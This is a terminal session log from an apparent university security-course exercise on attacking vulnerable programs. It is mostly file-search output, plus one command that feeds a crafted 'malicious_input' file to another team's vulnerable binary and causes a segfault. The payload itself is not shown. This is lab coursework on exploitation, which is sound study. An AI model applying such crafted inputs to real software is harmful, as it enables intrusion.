acct.h      fanotify.h  kd.h           poll.h    resource.h   statfs.h     termios.h      uio.h         vt.h
auxv.h      fcntl.h     klog.h         prctl.h   select.h     stat.h       timeb.h        ultrasound.h  vtimes.h
bitypes.h   file.h      mman.h         procfs.h  sem.h        statvfs.h    time.h         un.h          wait.h
cdefs.h     fsuid.h     mount.h        profil.h  sendfile.h   stropts.h    timerfd.h      unistd.h      xattr.h
debugreg.h  gmon.h      msg.h          ptrace.h  shm.h        swap.h       times.h        user.h
dir.h       gmon_out.h  mtio.h         queue.h   signalfd.h   syscall.h    timex.h        ustat.h
elf.h       inotify.h   param.h        quota.h   signal.h     sysctl.h     ttychars.h     utsname.h
epoll.h     ioctl.h     pci.h          raw.h     socket.h     sysinfo.h    ttydefaults.h  vfs.h
errno.h     io.h        perm.h         reboot.h  socketvar.h  syslog.h     types.h        vlimit.h
eventfd.h   ipc.h       personality.h  reg.h     soundcard.h  sysmacros.h  ucontext.h     vm86.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate fault.h
/usr/include/x86_64-linux-gnu/c++/5/bits/gthr-default.h
/usr/src/linux-headers-4.4.0-130/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/mac80211/rc/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/wq/power/efficient/default.h
/usr/src/linux-headers-4.4.0-133/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/mac80211/rc/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/wq/power/efficient/default.h
/usr/src/linux-headers-4.4.0-134/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/mac80211/rc/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/wq/power/efficient/default.h
/usr/src/linux-headers-4.4.0-137/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/mac80211/rc/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/wq/power/efficient/default.h
/usr/src/linux-headers-4.4.0-138/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/mac80211/rc/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/message/loglevel/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/mtrr/sanitizer/enable/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/mtrr/sanitizer/spare/reg/nr/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/nls/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/nouveau/debug/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/pcieaspm/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/security/apparmor/hash/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/snd/ac97/power/save/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/snd/hda/power/save/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/snd/seq/hrtimer/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/tahvo/usb/host/by/default.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/wq/power/efficient/default.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate /fault.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ less /usr/include/errno.h 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ less /usr/include/error.h 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ pwd
/home/ryadav3/576/assigns/assignment2/team5/hw2-more_attacks
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ kill -9 $$
Connection to nemo.srcit.stevens-tech.edu closed.
Lunarantic:576 Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

38 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Tue Oct 30 15:43:12 2018 from 155.246.203.206
ryadav3@nemo:~$ cd 576/assigns/assignment2/team5/
ryadav3@nemo:~/576/assigns/assignment2/team5$ ls
hw25_late_24270_4248172_hw2.tgz  hw2-more_attacks
ryadav3@nemo:~/576/assigns/assignment2/team5$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls -la
total 58
drwx------+ 2 ryadav3 student   22 Oct 30 16:04 .
drwxr-xr-x+ 3 ryadav3 student    4 Oct 30 15:58 ..
-rw-r--r--+ 1 ryadav3 student  125 Oct 29 19:52 malicious_input1.py
-rw-r--r--+ 1 ryadav3 student   39 Oct 29 19:52 malicious_input1.txt
-rw-r--r--+ 1 ryadav3 student  170 Oct 28 18:16 malicious_input2.py
-rw-r--r--+ 1 ryadav3 student  100 Oct 28 18:16 malicious_input2.txt
-rw-r--r--+ 1 ryadav3 student  181 Oct 29 20:03 malicious_input3.py
-rw-r--r--+ 1 ryadav3 student  271 Oct 29 20:03 malicious_input3.txt
-rw-r--r--+ 1 ryadav3 student  113 Oct 29 20:50 malicious_input4.py
-rw-r--r--+ 1 ryadav3 student   18 Oct 29 20:50 malicious_input4.txt
-rw-r--r--+ 1 ryadav3 student  721 Oct 29 20:01 task1.txt
-rw-r--r--+ 1 ryadav3 student  733 Oct 28 18:32 task2.txt
-rw-r--r--+ 1 ryadav3 student  336 Oct 29 20:03 task3.txt
-rw-r--r--+ 1 ryadav3 student  579 Oct 29 20:51 task4.txt
-rwxr-xr-x+ 1 ryadav3 student 9160 Oct 12 23:32 vuln_prog1.bin
-rw-------+ 1 ryadav3 student  861 Oct 16 13:40 vuln_prog1.c
-rwxr-xr-x+ 1 ryadav3 student 9088 Oct 13 00:24 vuln_prog2.bin
-rw-------+ 1 ryadav3 student  813 Oct 16 13:40 vuln_prog2.c
-rwxr-xr-x+ 1 ryadav3 student 7492 Oct 13 01:16 vuln_prog3.bin
-rw-------+ 1 ryadav3 student  345 Oct 16 13:40 vuln_prog3.c
-rwx------+ 1 ryadav3 student 8904 Oct 16 13:40 vuln_prog4.bin
-rw-------+ 1 ryadav3 student  449 Oct 16 13:40 vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ../../team3/hw2-more_attacks/vuln_prog1.bin 104 < malicious_input1.txt
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ dmesg | tail -1
[5555512.547088] vuln_prog1.bin[420]: segfault at 0 ip 00007f41c0a02bc6 sp 00007ffc05ffa150 error 6 in libc-2.23.so[7f41c09b6000+1c0000]
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ man traps
No manual entry for traps
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate traps
/usr/src/linux-headers-4.4.0-130/arch/arm/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/arm64/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/avr32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/blackfin/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/c6x/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/h8300/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/hexagon/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/m68k/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/metag/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/mips/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/nios2/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/parisc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/sh/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/sh/include/asm/traps_32.h
/usr/src/linux-headers-4.4.0-130/arch/sh/include/asm/traps_64.h
/usr/src/linux-headers-4.4.0-130/arch/sparc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/sparc/include/uapi/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/tile/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/unicore32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/x86/include/asm/mach_traps.h
/usr/src/linux-headers-4.4.0-130/arch/x86/include/asm/traps.h
/usr/src/linux-headers-4.4.0-130/arch/xtensa/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/arm/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/arm64/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/avr32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/blackfin/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/c6x/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/h8300/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/hexagon/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/m68k/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/metag/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/mips/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/nios2/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/parisc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/sh/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/sh/include/asm/traps_32.h
/usr/src/linux-headers-4.4.0-133/arch/sh/include/asm/traps_64.h
/usr/src/linux-headers-4.4.0-133/arch/sparc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/sparc/include/uapi/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/tile/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/unicore32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/x86/include/asm/mach_traps.h
/usr/src/linux-headers-4.4.0-133/arch/x86/include/asm/traps.h
/usr/src/linux-headers-4.4.0-133/arch/xtensa/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/arm/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/arm64/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/avr32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/blackfin/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/c6x/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/h8300/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/hexagon/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/m68k/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/metag/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/mips/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/nios2/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/parisc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/sh/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/sh/include/asm/traps_32.h
/usr/src/linux-headers-4.4.0-134/arch/sh/include/asm/traps_64.h
/usr/src/linux-headers-4.4.0-134/arch/sparc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/sparc/include/uapi/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/tile/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/unicore32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/x86/include/asm/mach_traps.h
/usr/src/linux-headers-4.4.0-134/arch/x86/include/asm/traps.h
/usr/src/linux-headers-4.4.0-134/arch/xtensa/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/arm/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/arm64/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/avr32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/blackfin/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/c6x/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/h8300/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/hexagon/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/m68k/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/metag/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/mips/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/nios2/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/parisc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/sh/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/sh/include/asm/traps_32.h
/usr/src/linux-headers-4.4.0-137/arch/sh/include/asm/traps_64.h
/usr/src/linux-headers-4.4.0-137/arch/sparc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/sparc/include/uapi/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/tile/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/unicore32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/x86/include/asm/mach_traps.h
/usr/src/linux-headers-4.4.0-137/arch/x86/include/asm/traps.h
/usr/src/linux-headers-4.4.0-137/arch/xtensa/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/arm/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/arm64/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/avr32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/blackfin/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/c6x/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/h8300/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/hexagon/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/m68k/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/metag/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/mips/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/nios2/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/parisc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/sh/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/sh/include/asm/traps_32.h
/usr/src/linux-headers-4.4.0-138/arch/sh/include/asm/traps_64.h
/usr/src/linux-headers-4.4.0-138/arch/sparc/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/sparc/include/uapi/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/tile/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/unicore32/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/x86/include/asm/mach_traps.h
/usr/src/linux-headers-4.4.0-138/arch/x86/include/asm/traps.h
/usr/src/linux-headers-4.4.0-138/arch/xtensa/include/asm/traps.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ less /usr/src/linux-headers-4.4.0-138/arch/x86/include/asm/traps.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate faults
/etc/X11/app-defaults
/etc/X11/app-defaults/Editres
/etc/X11/app-defaults/Editres-color
/etc/X11/app-defaults/KOI8RXTerm
/etc/X11/app-defaults/KOI8RXTerm-color
/etc/X11/app-defaults/UXTerm
/etc/X11/app-defaults/UXTerm-color
/etc/X11/app-defaults/Viewres
/etc/X11/app-defaults/Viewres-color
/etc/X11/app-defaults/XFontSel
/etc/X11/app-defaults/XTerm
/etc/X11/app-defaults/XTerm-color
/etc/X11/app-defaults/Xfd
/etc/X11/app-defaults/Xmessage
/etc/X11/app-defaults/Xmessage-color
/etc/X11/app-defaults/Xvidtune
/etc/gconf/gconf.xml.defaults
/etc/texmf/texdoctk/texdocrc.defaults
/etc/xdg/user-dirs.defaults
/usr/include/sys/ttydefaults.h
/usr/include/x86_64-linux-gnu/sys/ttydefaults.h
/usr/lib/libreoffice/share/config/soffice.cfg/modules/smath/ui/savedefaultsdialog.ui
/usr/lib/ruby/2.3.0/rubygems/defaults.rb
/usr/lib/ruby/vendor_ruby/nokogiri/html/element_description_defaults.rb
/usr/lib/ruby/vendor_ruby/puppet/defaults.rb
/usr/lib/ruby/vendor_ruby/puppet/parser/ast/resource_defaults.rb
/usr/lib/ruby/vendor_ruby/rubygems/defaults
/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb
/usr/lib/x86_64-linux-gnu/perl/5.22.1/sys/ttydefaults.ph
/usr/sbin/applygnupgdefaults
/usr/share/dh-python/dhpython/_defaults.py
/usr/share/dh-python/dhpython/__pycache__/_defaults.cpython-35.pyc
/usr/share/gconf/defaults
/usr/share/java/java_defaults.mk
/usr/share/man/man5/user-dirs.defaults.5.gz
/usr/share/man/man8/applygnupgdefaults.8.gz
/usr/share/python/debian_defaults
/usr/share/python3/debian_defaults
/usr/share/tcltk/tk8.6/ttk/defaults.tcl
/usr/share/texlive/texmf-dist/texdoctk/texdocrc-win32.defaults
/usr/share/vim/vim74/ftplugin/xdefaults.vim
/usr/share/vim/vim74/syntax/xdefaults.vim
/usr/src/linux-headers-4.4.0-130-generic/include/config/ipmi/si/probe/defaults.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/ipmi/si/probe/defaults.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/ipmi/si/probe/defaults.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/ipmi/si/probe/defaults.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/ipmi/si/probe/defaults.h
/var/lib/gconf/debian.defaults
/var/lib/gconf/defaults
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls /usr/src/linux-headers-4.4.0-138/arch/x86/include/asm/
acenv.h              emergency-restart.h  kgdb.h             pci-direct.h            spinlock.h
acpi.h               entry_arch.h         kmap_types.h       pci-functions.h         spinlock_types.h
agp.h                espfix.h             kmemcheck.h        pci.h                   sta2x11.h
alternative-asm.h    exec.h               kprobes.h          pci_x86.h               stackprotector.h
alternative.h        fb.h                 kvm_emulate.h      percpu.h                stacktrace.h
amd_nb.h             fixmap.h             kvm_guest.h        perf_event.h            string_32.h
a.out-core.h         floppy.h             kvm_host.h         perf_event_p4.h         string_64.h
apb_timer.h          fpu                  kvm_para.h         pgalloc.h               string.h
apicdef.h            frame.h              lguest.h           pgtable-2level.h        suspend_32.h
apic_flat_64.h       ftrace.h             lguest_hcall.h     pgtable-2level_types.h  suspend_64.h
apic.h               futex.h              linkage.h          pgtable_32.h            suspend.h
apm.h                gart.h               livepatch.h        pgtable_32_types.h      svm.h
arch_hweight.h       genapic.h            local64.h          pgtable-3level.h        swiotlb.h
archrandom.h         geode.h              local.h            pgtable-3level_types.h  switch_to.h
asm.h                gpio.h               mach_timer.h       pgtable_64.h            sync_bitops.h
asm-offsets.h        hardirq.h            mach_traps.h       pgtable_64_types.h      syscall.h
asm-prototypes.h     highmem.h            math_emu.h         pgtable.h               syscalls.h
atomic64_32.h        hpet.h               mc146818rtc.h      pgtable-invert.h        sysfb.h
atomic64_64.h        hugetlb.h            mce.h              pgtable_types.h         sys_ia32.h
atomic.h             hw_breakpoint.h      microcode_amd.h    platform_sst_audio.h    tce.h
barrier.h            hw_irq.h             microcode.h        pmc_atom.h              text-patching.h
bios_ebda.h          hypertransport.h     microcode_intel.h  pmem.h                  thread_info.h
bitops.h             hypervisor.h         misc.h             pm-trace.h              time.h
boot.h               i8259.h              mmconfig.h         posix_types.h           timer.h
bootparam_utils.h    ia32.h               mmu_context.h      preempt.h               timex.h
bug.h                ia32_unistd.h        mmu.h              probe_roms.h            tlbflush.h
bugs.h               idle.h               mmx.h              processor-cyrix.h       tlb.h
cacheflush.h         imr.h                mmzone_32.h        processor-flags.h       topology.h
cache.h              inat.h               mmzone_64.h        processor.h             trace
calgary.h            inat_types.h         mmzone.h           prom.h                  trace_clock.h
ce4100.h             init.h               module.h           proto.h                 traps.h
checksum_32.h        insn.h               mpspec_def.h       ptrace.h                tsc.h
checksum_64.h        inst.h               mpspec.h           pvclock-abi.h           uaccess_32.h
checksum.h           intel-family.h       mpx.h              pvclock.h               uaccess_64.h
clocksource.h        intel-mid.h          mshyperv.h         qrwlock.h               uaccess.h
cmdline.h            intel_mid_vrtc.h     msidef.h           qspinlock.h             unaligned.h
cmpxchg_32.h         intel_pmc_ipc.h      msi.h              qspinlock_paravirt.h    unistd.h
cmpxchg_64.h         intel_punit_ipc.h    msr.h              realmode.h              uprobes.h
cmpxchg.h            intel_scu_ipc.h      msr-index.h        reboot_fixups.h         user_32.h
compat.h             intel_telemetry.h    mtrr.h             reboot.h                user32.h
cpu_device_id.h      io_apic.h            mutex_32.h         required-features.h     user_64.h
cpufeature.h         io.h                 mutex_64.h         rio.h                   user.h
cpufeatures.h        iomap.h              mutex.h            rmwcc.h                 uv
cpu.h                iommu.h              mwait.h            rtc.h                   vdso.h
cpumask.h            iommu_table.h        nmi.h              rwsem.h                 vga.h
crash.h              iosf_mbi.h           nops.h             seccomp.h               vgtod.h
crypto               ipi.h                nospec-branch.h    sections.h              virtext.h
current.h            irqdomain.h          numa_32.h          segment.h               vm86.h
debugreg.h           irqflags.h           numachip           serial.h                vmx.h
delay.h              irq.h                numa.h             setup_arch.h            vsyscall.h
desc_defs.h          irq_regs.h           olpc.h             setup.h                 vvar.h
desc.h               irq_remapping.h      olpc_ofw.h         shmparam.h              word-at-a-time.h
device.h             irq_vectors.h        page_32.h          sigcontext.h            x2apic.h
disabled-features.h  irq_work.h           page_32_types.h    sigframe.h              x86_init.h
div64.h              ist.h                page_64.h          sighandling.h           xen
dma.h                jump_label.h         page_64_types.h    signal.h                xor_32.h
dma-mapping.h        kaiser.h             page.h             simd.h                  xor_64.h
dmi.h                kasan.h              page_types.h       smap.h                  xor_avx.h
dwarf2.h             kbdleds.h            paravirt.h         smp.h                   xor.h
e820.h               Kbuild               paravirt_types.h   sparsemem.h
edac.h               kdebug.h             parport.h          spec_ctrl.h
efi.h                kexec-bzimage64.h    pat.h              spec-ctrl.h
elf.h                kexec.h              pci_64.h           special_insns.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate fault.h
/usr/include/x86_64-linux-gnu/c++/5/bits/gthr-default.h
/usr/src/linux-headers-4.4.0-130/arch/hexagon/include/asm/vm_fault.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/doublefault.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/arch/sparsemem/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/calgary/iommu/enabled/by/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/crypto/rng/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/hpet/mmap/default.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/mac80211/rc/default.h
